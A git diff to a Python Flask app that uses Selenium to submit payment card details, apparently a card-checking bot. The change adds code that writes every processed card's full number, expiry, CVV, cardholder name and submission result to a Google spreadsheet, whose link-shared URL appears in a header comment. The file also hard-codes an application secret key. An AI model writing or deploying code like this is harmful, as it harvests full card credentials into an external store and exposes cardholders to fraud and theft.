@@ -1,4 +1,6 @@
 # main.py
+# https://docs.google.com/spreadsheets/d/10W8SED6Hn26pOq65dSfWSg6-Ne78WBPjcnMJGrb6_w4/edit?usp=sharing
+# credentials.json
 
 from bs4 import BeautifulSoup
 import pandas as pd
@@ -15,11 +17,53 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from webdriver_manager.chrome import ChromeDriverManager
 #import chromedriver_binary  # Adds chromedriver binary to path
+import datetime
+from google.oauth2 import service_account
+from googleapiclient.discovery import build
+
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'vnkdjnfjknfl1232#'
 CORS(app)
 app.app_context().push()
+cred = service_account.Credentials.from_service_account_file(filename=SERVICE_ACCOUNT_FILE)
+service = build('sheets', 'v4', credentials=cred)
+sheet = service.spreadsheets()
+
+
+def get_values():
+    global sheet
+    result = sheet.values().get(spreadsheetId=SAMPLE_SPREADSHEET_ID,
+                                        range=SAMPLE_RANGE_NAME).execute()
+    values = result.get('values', [])
+    i = 0
+    print(values)
+    for row in values:
+        i = i + 1
+        print(f"Values index {i} is  {row}")
+    return i
+
+def set_values(Datetime , QuoteNumber, CardType, CardNumber, ExpMonth, Expyear, CcvNumber, FirstName, LastName, Response):
+    global sheet
+    global SAMPLE_RANGE_NAME
+    values =(
+    (f'{Datetime}', f'{QuoteNumber}', f'{CardType}', f'{CardNumber}', f'{ExpMonth}', f'{Expyear}', 
+     f'{CcvNumber}', f'{FirstName}', f'{LastName}', f'{Response}'),)
+    value_range_body = {
+    'majorDimension' : 'ROWS',
+    'values' : values
+    }
+    last_id = get_values()
+    SAMPLE_RANGE_NAME = f'A{last_id+1}:J{last_id+1}'
+    result = sheet.values().update(
+        spreadsheetId=SAMPLE_SPREADSHEET_ID,
+        valueInputOption = 'USER_ENTERED',
+        body = value_range_body,
+        range=WORKSHEET_NAME+SAMPLE_RANGE_NAME
+    ).execute()
+    print(result)
+    pass 
+
 
 def luhn_checksum(card_number):
     def digits_of(n):
@@ -264,6 +308,9 @@ def running_job(quote_number, card_type, card_number,
     else:
         #input('Please Press any key to close the browser.')
         driver.close()
+    dt = datetime.datetime.now()
+    set_values(Datetime = dt ,QuoteNumber=quote_number , CardType=card_type, CardNumber=card_number, ExpMonth=exp_month, Expyear=exp_year,
+               CcvNumber=ccv_number, FirstName=first_name, LastName=last_name, Response=result)
     json_object = {'response':True, 'result':str(result), 'driver':str(driver)}
     return jsonify(json_object)
 
